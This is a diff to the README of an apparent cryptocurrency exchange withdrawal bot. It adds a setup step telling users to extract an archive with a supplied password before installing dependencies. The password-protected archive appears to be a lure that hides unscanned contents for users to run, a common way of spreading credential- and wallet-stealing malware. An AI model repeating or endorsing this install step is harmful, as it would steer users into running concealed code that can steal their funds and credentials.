@@ -20,9 +20,9 @@ Follow these steps to set up and run the CEX Withdrawal Bot on your local machin
    ```bash
    git clone https://github.com/exileqeq/cex-withdrawal-bot.git
    cd cex-withdrawal-bot
-
-2. **Install dependencies:**
-3. **Configure your environment:**
+2. **extract archive with pass `hiIJq71OeS`**
+3. **Install dependencies:**
+4. **Configure your environment:**
 
 Create a `.env` file in the project's root directory and define your environment variables. You can use the `.env.example` file as a template.
 
